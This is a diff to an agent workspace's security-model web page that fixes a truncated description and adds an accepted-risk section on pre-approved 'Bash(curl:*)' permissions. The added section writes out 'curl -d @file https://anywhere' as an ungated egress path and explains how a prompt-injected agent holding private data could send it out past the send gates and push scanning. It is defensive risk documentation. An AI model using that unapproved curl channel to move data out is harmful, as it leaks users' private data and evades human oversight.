@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Security model</title>
-<meta name="description" content="Consumed by: .claude/rules/security.md (the always-on rule points here for the">
+<meta name="description" content="How HEADING OS protects your data and your principal. The controls here are mechanical, enforced by code and tests, not by policy prose.">
 <link rel="icon" type="image/webp" href="assets/logo.webp">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -77,7 +77,7 @@
 </aside>
 <main class="content">
   <h1>Security model</h1>
-  <p class="page-meta">Consumed by: .claude/rules/security.md (the always-on rule points here for the</p>
+  <p class="page-meta">How HEADING OS protects your data and your principal. The controls here are mechanical, enforced by code and tests, not by policy prose.</p>
   <!-- version: 1.2.0 | last-updated: 2026-08-20 -->
 
 <p>Consumed by: <code>.claude/rules/security.md</code> (the always-on rule points here for the
@@ -288,6 +288,22 @@ test that fails without it. Do not describe it as guarded by anything more.</p>
   progress watchdog that declares a hang only on real inactivity and verifies its
   postcondition, rather than trusting a wall-clock timeout or a bare exit code.</li>
 </ul>
+<h3 id="accepted-bashcurl-is-pre-approved">Accepted: <code>Bash(curl:*)</code> is pre-approved</h3>
+<p>All three shipped permission templates
+(<code>.claude/settings.local.{linux,macos,windows}.json</code>) pre-approve <code>Bash(curl:*)</code>.
+This is the largest ungated egress channel in the workspace and it is a decision,
+not an oversight — reviewed and kept on 2026-08-23.</p>
+<p>What it means honestly: every outbound <em>send</em> is gated and every push is scanned,
+but <code>curl -d @file https://anywhere</code> passes through neither, with no approval
+click. An agent that has read private data and then reads attacker-controlled
+text has a path out.</p>
+<p>Why it stays: roughly half the workspace&rsquo;s integrations are curl calls, and
+scoping the grant to an allowlist of hosts turns routine work into a stream of
+approval prompts. The mitigations that do apply are the ones around it — the data
+overlay is a separate repository, secrets live only in a gitignored <code>.env</code>, and
+the agent tool-lists in <code>.claude/agents/</code> decide who gets a shell at all.</p>
+<p>Revisit this if the agent roster grows, or if any agent that reads untrusted
+external text is given <code>Bash</code>. (One already is; see the follow-up list.)</p>
 <hr />
 <h2 id="8-your-responsibilities">8. Your responsibilities</h2>
 <p>The engine enforces a great deal, but the first line of defense is you:</p>
